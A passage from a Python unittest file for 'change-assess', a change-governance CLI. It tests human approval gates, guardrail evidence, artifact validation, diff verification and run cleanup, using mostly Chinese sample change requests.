        original_pwd = os.environ.get("PWD")
        try:
            cli_module.Path.cwd = classmethod(lambda cls: (_ for _ in ()).throw(OSError("cwd unavailable")))
            os.environ["PWD"] = str(temp)
            self.assertEqual(temp.resolve(), cli_module._project_root())
        finally:
            cli_module.Path.cwd = original_cwd
            if original_pwd is None:
                os.environ.pop("PWD", None)
            else:
                os.environ["PWD"] = original_pwd
            shutil.rmtree(temp)

    def test_cli_assess_generates_phase1_artifacts_and_stops(self):
        temp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(ROOT / ".ai-governance", temp / ".ai-governance", ignore=shutil.ignore_patterns("runs"))
            shutil.copytree(ROOT / "lib", temp / "lib")
            shutil.copytree(ROOT / "bin", temp / "bin")
            subprocess.run(["git", "init"], cwd=temp, check=True, capture_output=True, text=True)
            env = os.environ.copy()
            env["PYTHONPATH"] = str(temp / "lib")
            result = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "修改后台订单页面上的提示文案。"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
            self.assertIn("Review command: change-assess --review-workflow", result.stdout)
            runs = [path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir()]
            self.assertEqual(1, len(runs))
            status = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--status", runs[0].name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(status.returncode, 0, status.stderr + status.stdout)
            self.assertIn("Run Status", status.stdout)
            self.assertIn("Current gate: workflow_plan_approval", status.stdout)
            self.assertIn("workflow not approved", status.stdout)
            self.assertIn("change-assess --approve-workflow", status.stdout)
            # Operator Summary console view leads --status (change 3)
            self.assertIn("# Operator Summary", status.stdout)
            self.assertIn("Current stage:", status.stdout)
            self.assertIn("Risk:", status.stdout)
            # Operator Summary block leads review.md (change 1)
            review_md = (runs[0] / "review.md").read_text(encoding="utf-8")
            self.assertTrue(review_md.startswith("# Operator Summary"), review_md[:80])
            self.assertIn("Recommended action:", review_md)
            self.assertIn("Blocked by:", review_md)
            self.assertIn("Audit files:", review_md)
            # Workflow Summary block leads workflow-plan.md (change 2)
            plan_md = (runs[0] / "workflow-plan.md").read_text(encoding="utf-8")
            self.assertTrue(plan_md.startswith("# Workflow Summary"), plan_md[:80])
            self.assertIn("Risk level:", plan_md)
            self.assertIn("Required modules:", plan_md)
            self.assertIn("Next gate:", plan_md)
            next_action = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--next", runs[0].name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(next_action.returncode, 0, next_action.stderr + next_action.stdout)
            self.assertIn("Next action: approve_workflow", next_action.stdout)
            self.assertIn("Requires human confirmation: yes", next_action.stdout)
            self.assertIn("Reason: Workflow approval is required", next_action.stdout)
            execute_next = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--next", runs[0].name, "--execute-next"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(execute_next.returncode, 3, execute_next.stderr + execute_next.stdout)
            self.assertIn("requires user confirmation", execute_next.stdout)
            continued = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--continue", runs[0].name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(continued.returncode, 0, continued.stderr + continued.stdout)
            self.assertIn("# Operator Summary", continued.stdout)
            self.assertIn("Requires human confirmation: yes", continued.stdout)
            self.assertIn("Continue stopped at gate: workflow_plan_approval", continued.stdout)
            self.assertIn("change-assess --approve-workflow", continued.stdout)
            self.assertFalse((runs[0] / ".workflow-approved").exists())
            self.assertFalse((runs[0] / "approved-workflow.yaml").exists())
            self.assertFalse((runs[0] / "technical-plan.yaml").exists())
            for artifact in ("evidence-pack.yaml", "risk-assessment.yaml", "risk-assessment.md", "investigation-questions.yaml", "investigation-questions.md", "workflow-plan.md"):
                self.assertTrue((runs[0] / artifact).exists(), artifact)
            evidence = load_yaml(runs[0] / "evidence-pack.yaml")
            self.assertIn("investigation_questions", evidence)
            self.assertTrue(evidence["investigation_questions"]["questions"])
            investigation = load_yaml(runs[0] / "investigation-questions.yaml")
            self.assertEqual("open", investigation["status"])
            self.assertTrue(all(item.get("expected_artifact") for item in investigation["questions"]))
            risk_data = load_yaml(runs[0] / "risk-assessment.yaml")
            self.assertIn("risk_explanation", risk_data)
            self.assertTrue(risk_data["risk_explanation"]["dimension_explanations"])
            self.assertTrue(risk_data["risk_explanation"]["guardrail_evaluations"])
            risk_md = (runs[0] / "risk-assessment.md").read_text(encoding="utf-8")
            self.assertIn("## Dimension Scores", risk_md)
            self.assertIn("## Guardrail Evaluations", risk_md)
            for artifact in ("review.md", "human-review.yaml"):
                self.assertTrue((runs[0] / artifact).exists(), artifact)
            progress = load_yaml(runs[0] / "progress.yaml")
            self.assertTrue(progress["steps"])
            self.assertEqual("done", progress["steps"][0]["status"])
            self.assertIsNotNone(progress["steps"][0]["duration_seconds"])
            review_md = (runs[0] / "review.md").read_text(encoding="utf-8")
            self.assertIn("Review Commands", review_md)
            self.assertIn("Investigation Questions", review_md)
            self.assertNotIn("Editable File", review_md)
            self.assertNotIn("Edit `human-review.yaml`", review_md)
            self.assertFalse((runs[0] / "technical-plan.md").exists())
            workflow_plan = (runs[0] / "workflow-plan.md").read_text(encoding="utf-8")
            self.assertIn("待调查问题", workflow_plan)
            self.assertIn("不得生成 technical-plan", workflow_plan)
        finally:
            shutil.rmtree(temp)

    def test_human_review_can_approve_and_add_modules(self):
        temp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(ROOT / ".ai-governance", temp / ".ai-governance", ignore=shutil.ignore_patterns("runs"))
            shutil.copytree(ROOT / "lib", temp / "lib")
            shutil.copytree(ROOT / "bin", temp / "bin")
            subprocess.run(["git", "init"], cwd=temp, check=True, capture_output=True, text=True)
            env = os.environ.copy()
            env["PYTHONPATH"] = str(temp / "lib")
            result = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "修改后台订单页面上的提示文案。"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
            review = load_yaml(run_dir / "human-review.yaml")
            review["decision"] = "approve"
            review["module_changes"]["add_required"] = ["requirement_confirmation"]
            with (run_dir / "human-review.yaml").open("w", encoding="utf-8") as handle:
                import yaml

                yaml.safe_dump(review, handle, sort_keys=False, allow_unicode=True)
            approval = subprocess.run(
                [
                    sys.executable,
                    str(temp / "bin/change-assess"),
                    "--approve-workflow",
                    run_dir.name,
                    "--add-required",
                    "threat_analysis",
                ],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(approval.returncode, 0, approval.stderr + approval.stdout)
            approved = load_yaml(run_dir / "approved-workflow.yaml")
            self.assertIn("requirement_confirmation", approved["workflow_recommendation"]["required_modules"])
            self.assertIn("threat_analysis", approved["workflow_recommendation"]["required_modules"])
            self.assertEqual("human_cli_approval", approved["approval"]["reviewer"])
            self.assertTrue((run_dir / "approved-workflow-plan.md").exists())
            self.assertTrue((run_dir / ".workflow-approved").exists())
            self.assertFalse((run_dir / "technical-plan.md").exists())
            next_action = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--next", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(next_action.returncode, 0, next_action.stderr + next_action.stdout)
            self.assertIn("Next action: answer_investigation_question", next_action.stdout)
            self.assertIn("Investigation questions:", next_action.stdout)
        finally:
            shutil.rmtree(temp)

    def test_technical_plan_gate_requires_workflow_then_approval(self):
        temp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(ROOT / ".ai-governance", temp / ".ai-governance", ignore=shutil.ignore_patterns("runs"))
            shutil.copytree(ROOT / "lib", temp / "lib")
            shutil.copytree(ROOT / "bin", temp / "bin")
            subprocess.run(["git", "init"], cwd=temp, check=True, capture_output=True, text=True)
            env = os.environ.copy()
            env["PYTHONPATH"] = str(temp / "lib")
            assess = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "修改后台订单页面上的提示文案。"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(assess.returncode, 0, assess.stderr + assess.stdout)
            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())

            blocked_plan = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--propose-technical-plan", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(3, blocked_plan.returncode)
            self.assertIn("workflow approval is required", blocked_plan.stdout)

            approval = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--approve-workflow", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(approval.returncode, 0, approval.stderr + approval.stdout)
            context = subprocess.run(
                [
                    sys.executable,
                    str(temp / "bin/change-assess"),
                    "--add-context",
                    run_dir.name,
                    "--include",
                    "edit copy text",
                    "--exclude",
                    "business logic changes",
                    "--user-fact",
                    "copy-only change confirmed",
                ],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(context.returncode, 0, context.stderr + context.stdout)

            proposed = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--propose-technical-plan", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(proposed.returncode, 0, proposed.stderr + proposed.stdout)
            self.assertTrue((run_dir / "technical-plan.yaml").exists())
            plan = load_yaml(run_dir / "technical-plan.yaml")
            self.assertEqual("pass", plan["validation"]["status"])
            self.assertIn("edit copy text", plan["scope"]["included"])
            for module in load_yaml(run_dir / "approved-workflow.yaml")["workflow_recommendation"]["required_modules"]:
                self.assertIn(module, plan["module_coverage"])

            blocked_gate = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--check-gate", run_dir.name, "--stage", "implementation"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(3, blocked_gate.returncode)
            self.assertIn("technical plan has not been approved", blocked_gate.stdout)

            technical_approval = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--approve-technical-plan", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(technical_approval.returncode, 0, technical_approval.stderr + technical_approval.stdout)
            self.assertTrue((run_dir / ".technical-plan-approved").exists())

            gate = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--check-gate", run_dir.name, "--stage", "implementation"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(gate.returncode, 0, gate.stderr + gate.stdout)
            self.assertIn("GATE OK", gate.stdout)
        finally:
            shutil.rmtree(temp)

    def test_agent_tasks_are_generated_from_approved_workflow_level(self):
        temp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(ROOT / ".ai-governance", temp / ".ai-governance", ignore=shutil.ignore_patterns("runs"))
            shutil.copytree(ROOT / "lib", temp / "lib")
            shutil.copytree(ROOT / "bin", temp / "bin")
            subprocess.run(["git", "init"], cwd=temp, check=True, capture_output=True, text=True)
            env = os.environ.copy()
            env["PYTHONPATH"] = str(temp / "lib")
            assess = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "删除重复配置数据。"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(assess.returncode, 0, assess.stderr + assess.stdout)
            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
            approval = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--approve-workflow", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(approval.returncode, 0, approval.stderr + approval.stdout)
            tasks = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--generate-agent-tasks", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(tasks.returncode, 0, tasks.stderr + tasks.stdout)
            artifact = load_yaml(run_dir / "agent-tasks.yaml")
            self.assertTrue(artifact["policy"]["subagents_required"])
            self.assertTrue(artifact["investigation_questions"])
            task_ids = {task["id"] for task in artifact["tasks"]}
            self.assertIn("code_fact_scan", task_ids)
            self.assertIn("data_impact_analysis", task_ids)
            self.assertIn("adversarial_review", task_ids)
            self.assertIn("implementation_gate", task_ids)
            dependency_task = next(task for task in artifact["tasks"] if task["id"] == "dependency_analysis")
            self.assertIn("--complete-step", dependency_task["completion_command"])
            self.assertIn("--module dependency_analysis", dependency_task["completion_command"])
            self.assertTrue(any("answer investigation question" in item for item in dependency_task["constraints"]))
            self.assertTrue((run_dir / "agent-tasks.md").exists())

            started = subprocess.run(
                [
                    sys.executable,
                    str(temp / "bin/change-assess"),
                    "--start-step",
                    run_dir.name,
                    "--module",
                    "dependency_analysis",
                    "--agent",
                    "dependency-analyzer",
                ],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(started.returncode, 0, started.stderr + started.stdout)

            (run_dir / "dependency-analysis.yaml").write_text(
                "upstream: []\n"
                "downstream: []\n",
                encoding="utf-8",
            )
            invalid_completed = subprocess.run(
                [
                    sys.executable,
                    str(temp / "bin/change-assess"),
                    "--complete-step",
                    run_dir.name,
                    "--module",
                    "dependency_analysis",
                    "--artifact",
                    "dependency-analysis.yaml",
                    "--agent",
                    "dependency-analyzer",
                ],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(invalid_completed.returncode, 3, invalid_completed.stderr + invalid_completed.stdout)
            self.assertIn("Artifact validation blocked", invalid_completed.stdout)
            self.assertIn("missing required field: external_consumers", invalid_completed.stdout)
            invalid_progress = load_yaml(run_dir / "progress.yaml")
            invalid_dependency_step = next(step for step in invalid_progress["steps"] if step["id"] == "dependency_analysis")
            self.assertEqual("blocked", invalid_dependency_step["status"])
            self.assertTrue((run_dir / "artifact-validation-dependency_analysis.yaml").exists())
            blocked_status = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--status", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(blocked_status.returncode, 0, blocked_status.stderr + blocked_status.stdout)
            self.assertIn("artifact-validation-dependency_analysis.yaml blocked", blocked_status.stdout)
            self.assertIn("workflow step blocked: dependency_analysis", blocked_status.stdout)
            self.assertIn("--validate-artifact", blocked_status.stdout)

            (run_dir / "dependency-analysis.yaml").write_text(
                "upstream: []\n"
                "downstream: []\n"
                "external_consumers: []\n"
                "unknowns: []\n"
                "evidence:\n"
                "  - FACT: call graph checked\n",
                encoding="utf-8",
            )
            vague_validation = subprocess.run(
                [
                    sys.executable,
                    str(temp / "bin/change-assess"),
                    "--validate-artifact",
                    run_dir.name,
                    "--module",
                    "dependency_analysis",
                    "--artifact",
                    "dependency-analysis.yaml",
                ],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(vague_validation.returncode, 3, vague_validation.stderr + vague_validation.stdout)
            self.assertIn("evidence[0].path is required", vague_validation.stdout)
            self.assertIn("evidence[0].line is required", vague_validation.stdout)
            self.assertIn("evidence[0].confidence must be high, medium, or low", vague_validation.stdout)

            cited = temp / "app/api/example.py"
            cited.parent.mkdir(parents=True, exist_ok=True)
            cited.write_text("".join(f"# line {n}\n" for n in range(1, 15)), encoding="utf-8")
            (run_dir / "dependency-analysis.yaml").write_text(
                "upstream: []\n"
                "downstream: []\n"
                "external_consumers: []\n"
                "unknowns: []\n"
                "evidence:\n"
                "  - path: app/api/example.py\n"
                "    line: 12\n"
                "    fact: 'FACT: call graph checked'\n"
                "    confidence: high\n",
                encoding="utf-8",
            )
            validation = subprocess.run(
                [
                    sys.executable,
                    str(temp / "bin/change-assess"),
                    "--validate-artifact",
                    run_dir.name,
                    "--module",
                    "dependency_analysis",
                    "--artifact",
                    "dependency-analysis.yaml",
                ],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(validation.returncode, 0, validation.stderr + validation.stdout)
            self.assertIn("Artifact validation: pass", validation.stdout)

            completed = subprocess.run(
                [
                    sys.executable,
                    str(temp / "bin/change-assess"),
                    "--complete-step",
                    run_dir.name,
                    "--module",
                    "dependency_analysis",
                    "--artifact",
                    "dependency-analysis.yaml",
                    "--agent",
                    "dependency-analyzer",
                    "--note",
                    "call graph checked",
                ],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(completed.returncode, 0, completed.stderr + completed.stdout)
            self.assertIn("Step completed: dependency_analysis", completed.stdout)
            self.assertIn("产物: dependency-analysis.yaml", completed.stdout)
            progress = load_yaml(run_dir / "progress.yaml")
            dependency_step = next(step for step in progress["steps"] if step["id"] == "dependency_analysis")
            self.assertEqual(dependency_step["status"], "done")
            self.assertEqual(dependency_step["agent"], "dependency-analyzer")
            self.assertIn("dependency-analysis.yaml", dependency_step["artifacts"])
            self.assertIn("call graph checked", dependency_step["notes"])
            self.assertIsNotNone(dependency_step["duration_seconds"])

            review = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--review-workflow", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(review.returncode, 0, review.stderr + review.stdout)
            self.assertIn("dependency-analysis.yaml", review.stdout)
        finally:
            shutil.rmtree(temp)

    def test_diff_verification_blocks_executable_change_for_comment_only_intent(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app").mkdir()
            database = temp / "app/database.py"
            database.write_text("# old comment\nDATABASE_NAME = 'main'\n", encoding="utf-8")
            intent_path = temp / "intent.yaml"
            intent_path.write_text(
                "\n".join([
                    "version: 1",
                    "change_kind: comment_change",
                    "change_nature: comment_only",
                    "summary: update a database.py comment only",
                    "confidence: high",
                    "request_goal:",
                    "  type: implementation",
                    "  requires_code_change: true",
                    "  default_stop_gate: workflow_plan_approval",
                    "scope:",
                    "  included: [comment only]",
                    "  excluded: [executable code]",
                    "  unknowns: [diff must confirm comment-only]",
                    "risk_hints:",
                    "  data_operation: false",
                    "  database_schema_change: false",
                    "  public_interface_change: false",
                    "  permission_change: false",
                    "  security_change: false",
                    "  financial_change: false",
                ]),
                encoding="utf-8",
            )
            subprocess.run(["git", "init"], cwd=temp, check=True, capture_output=True, text=True)
            subprocess.run(["git", "add", "."], cwd=temp, check=True, capture_output=True, text=True)
            subprocess.run(
                ["git", "-c", "user.name=Test", "-c", "user.email=test@example.com", "commit", "-m", "baseline"],
                cwd=temp,
                check=True,
                capture_output=True,
                text=True,
            )
            env = os.environ.copy()
            env["PYTHONPATH"] = str(ROOT / "lib")
            env["ACG_TOOL_ROOT"] = str(ROOT)
            assess = subprocess.run(
                [sys.executable, str(ROOT / "bin/change-assess"), "修改 app/database.py 中的一行注释", "--intent-file", str(intent_path)],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(assess.returncode, 0, assess.stderr + assess.stdout)
            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
            for command in (
                [sys.executable, str(ROOT / "bin/change-assess"), "--approve-workflow", run_dir.name],
                [sys.executable, str(ROOT / "bin/change-assess"), "--propose-technical-plan", run_dir.name],
                [sys.executable, str(ROOT / "bin/change-assess"), "--approve-technical-plan", run_dir.name],
            ):
                result = subprocess.run(command, cwd=temp, env=env, check=False, capture_output=True, text=True)
                self.assertEqual(result.returncode, 0, result.stderr + result.stdout)

            database.write_text("# new comment\nDATABASE_NAME = 'main'\n", encoding="utf-8")
            pass_result = subprocess.run(
                [sys.executable, str(ROOT / "bin/change-assess"), "--verify-diff", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(pass_result.returncode, 0, pass_result.stderr + pass_result.stdout)
            self.assertIn("Status: pass", pass_result.stdout)
            self.assertEqual("pass", load_yaml(run_dir / "diff-verification.yaml")["status"])
            approved_required = load_yaml(run_dir / "approved-workflow.yaml")["workflow_recommendation"]["required_modules"]
            for module in approved_required:
                completed_module = subprocess.run(
                    [sys.executable, str(ROOT / "bin/change-assess"), "--complete-step", run_dir.name, "--module", module],
                    cwd=temp,
                    env=env,
                    check=False,
                    capture_output=True,
                    text=True,
                )
                self.assertEqual(completed_module.returncode, 0, completed_module.stderr + completed_module.stdout)
            reassess = subprocess.run(
                [sys.executable, str(ROOT / "bin/change-assess"), "--reassess", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(reassess.returncode, 0, reassess.stderr + reassess.stdout)
            self.assertTrue((run_dir / "post-evidence-pack.yaml").exists())
            self.assertTrue((run_dir / "post-risk-assessment.yaml").exists())
            self.assertTrue((run_dir / "post-risk-assessment.md").exists())
            self.assertTrue((run_dir / "reassessment.yaml").exists())
            self.assertIn("Requires human reapproval: False", reassess.stdout)
            verification = subprocess.run(
                [sys.executable, str(ROOT / "bin/change-assess"), "--generate-verification-report", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(verification.returncode, 0, verification.stderr + verification.stdout)
            self.assertIn("Status: pass", verification.stdout)
            self.assertTrue((run_dir / "verification-report.yaml").exists())
            self.assertTrue((run_dir / ".verification-complete").exists())
            self.assertEqual("COMPLETED", load_yaml(run_dir / "run-state.yaml")["state"])

            database.write_text("# new comment\nDATABASE_NAME = 'other'\n", encoding="utf-8")
            blocked = subprocess.run(
                [sys.executable, str(ROOT / "bin/change-assess"), "--verify-diff", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(blocked.returncode, 3, blocked.stderr + blocked.stdout)
            self.assertIn("low-risk intent diff includes executable-looking changes", blocked.stdout)
            gate = subprocess.run(
                [sys.executable, str(ROOT / "bin/change-assess"), "--check-gate", run_dir.name, "--stage", "implementation"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(gate.returncode, 3, gate.stderr + gate.stdout)
            self.assertIn("diff verification is blocked", gate.stdout)
        finally:
            shutil.rmtree(temp)

    def test_cli_review_workflow_lists_user_actions(self):
        temp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(ROOT / ".ai-governance", temp / ".ai-governance", ignore=shutil.ignore_patterns("runs"))
            shutil.copytree(ROOT / "lib", temp / "lib")
            shutil.copytree(ROOT / "bin", temp / "bin")
            subprocess.run(["git", "init"], cwd=temp, check=True, capture_output=True, text=True)
            env = os.environ.copy()
            env["PYTHONPATH"] = str(temp / "lib")
            result = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "修改后台订单页面上的提示文案。"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
            review = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--review-workflow", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(review.returncode, 0, review.stderr + review.stdout)
            self.assertIn("Allowed user changes", review.stdout)
            self.assertIn("流程状态栏", review.stdout)
            self.assertIn("已执行", review.stdout)
            self.assertIn("Guardrail evidence", review.stdout)
            self.assertIn("Recommended execution steps", review.stdout)
            self.assertIn("扫描当前代码", review.stdout)
            self.assertIn("--add-required", review.stdout)
            self.assertIn("--review-decision", review.stdout)
            self.assertNotIn("Required modules:", review.stdout)
        finally:
            shutil.rmtree(temp)

    def test_cli_review_workflow_shows_guardrail_evidence(self):
        temp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(ROOT / ".ai-governance", temp / ".ai-governance", ignore=shutil.ignore_patterns("runs"))
            shutil.copytree(ROOT / "lib", temp / "lib")
            shutil.copytree(ROOT / "bin", temp / "bin")
            subprocess.run(["git", "init"], cwd=temp, check=True, capture_output=True, text=True)
            env = os.environ.copy()
            env["PYTHONPATH"] = str(temp / "lib")
            result = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "删除重复配置数据。"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
            review = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--review-workflow", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(review.returncode, 0, review.stderr + review.stdout)
            self.assertIn("Guardrail evidence", review.stdout)
            self.assertIn("DECISION: triggered destructive-database-operation", review.stdout)
            self.assertIn("FACT: user_request contains keyword '删除'", review.stdout)
        finally:
            shutil.rmtree(temp)

    def test_cleanup_runs_deletes_only_old_inactive_runs(self):
        temp = Path(tempfile.mkdtemp())
        try:
            runs = temp / ".ai-governance" / "runs"
            old_done = runs / "20260101-000000-old-done"
            old_active = runs / "20260101-000001-old-active"
            fresh_done = runs / "20260713-000000-fresh-done"
            for run_dir in (old_done, old_active, fresh_done):
                run_dir.mkdir(parents=True)
                (run_dir / "workflow-plan.md").write_text("plan", encoding="utf-8")
                (run_dir / "human-review.yaml").write_text("version: 1\n", encoding="utf-8")
            (old_done / ".workflow-approved").write_text("approved\n", encoding="utf-8")
            (fresh_done / ".workflow-approved").write_text("approved\n", encoding="utf-8")
            old_time = (datetime.now(timezone.utc) - timedelta(days=90)).timestamp()
            fresh_time = datetime.now(timezone.utc).timestamp()
            for path in (old_done, old_active):
                os.utime(path, (old_time, old_time))
            os.utime(fresh_done, (fresh_time, fresh_time))

            dry = cleanup_runs(runs, {"retain_latest": 1, "retain_days": 30}, dry_run=True)
            self.assertIn(old_done, dry.deleted)
            self.assertIn(old_active, dry.skipped)
            self.assertTrue(old_done.exists())

            result = cleanup_runs(runs, {"retain_latest": 1, "retain_days": 30}, dry_run=False)
            self.assertIn(old_done, result.deleted)
            self.assertFalse(old_done.exists())
            self.assertTrue(old_active.exists())
            self.assertTrue(fresh_done.exists())
        finally:
            shutil.rmtree(temp)

    def test_weak_file_signal_requires_human_confirmation(self):
        evidence = {
            "version": 1,
            "request": {"original": "移除 IoT 调试功能", "normalized_intent": "移除 IoT 调试功能", "acceptance_criteria": []},
            "repository": {"branch": "main", "commit": "abc", "dirty": False},
            "code_findings": {
                "direct_files": [{"path": "app/api/auth.py", "reason": "WEAK SIGNAL: generic API file"}],
                "related_files": [],
                "affected_modules": ["app"],
                "affected_domains": [],
                "change_types": ["public_api"],
                "operations": [],
                "domain_evidence": [],
                "change_type_evidence": [{
                    "value": "public_api",
                    "source": "code_search",
                    "path": "app/api/auth.py",
                    "keyword": "api",
                    "strength": "weak",
                    "fact": "WEAK SIGNAL: app/api/auth.py contains keyword 'api' mapped to change_type public_api but does not match request-specific tokens.",
                }],
                "operation_evidence": [],
                "database_changes": False,
                "message_schema_changes": False,
                "public_api_changes": True,
                "scheduled_jobs_affected": False,
                "configuration_changes": False,
            },
            "dependency_findings": {"upstream": [], "downstream": [], "external_dependencies": []},
            "test_findings": {"existing_tests": [], "coverage_confidence": "low", "missing_test_areas": []},
            "runtime_findings": {"production_usage": "unknown", "traffic_level": "unknown", "observability": "low", "rollback_capability": "low"},
            "unknowns": ["UNKNOWN: weak public API signal requires human confirmation"],
            "evidence_sources": ["code_search", "guardrails"],
        }
        risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
        public_detail = next(item for item in risk["triggered_guardrail_details"] if item["id"] == "public-interface-change")
        self.assertNotIn("public-interface-change", risk["triggered_guardrails"])
        self.assertEqual("weak", public_detail["strength"])
        self.assertTrue(public_detail["needs_human_confirmation"])

    def test_human_review_cannot_remove_hard_guardrail_module(self):
        evidence = RepositoryAnalyzer(ROOT).analyze("调整退款金额保留两位小数的计算方式。", self.project_risk)
        risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
        composer = WorkflowComposer(self.project_risk, self.modules)
        workflow = composer.compose(evidence, risk)
        temp = Path(tempfile.mkdtemp())
        try:
            from adaptive_change_governance.config_loader import dump_yaml

            dump_yaml(temp / "evidence-pack.yaml", evidence)
            dump_yaml(temp / "risk-assessment.yaml", risk)
            dump_yaml(temp / "workflow-recommendation.yaml", workflow)
            gate = HumanReviewGate(self.modules)
            gate.write_review_files(temp, evidence, risk, workflow)
            review = load_yaml(temp / "human-review.yaml")
            review["decision"] = "approve"
            review["module_changes"]["remove_required"] = ["business_rule_confirmation"]
            with (temp / "human-review.yaml").open("w", encoding="utf-8") as handle:
                import yaml

                yaml.safe_dump(review, handle, sort_keys=False, allow_unicode=True)
            with self.assertRaisesRegex(ReviewError, "cannot remove"):
                gate.approve_workflow(temp, self.project_risk)
        finally:
            shutil.rmtree(temp)

    def test_reassessment_escalates_when_rescan_reveals_higher_risk(self):
        # spec §23 用例五：初判低风险，实现中重扫发现设备控制域 -> 升级并要求重新审批。
        # 静态打分场景无法表达“初判 -> 重扫升级”这一动态过程，故以 ReassessmentRunner 单测覆盖。
        temp = Path(tempfile.mkdtemp())
        try:
            root = temp / "repo"
            (root / "device").mkdir(parents=True)
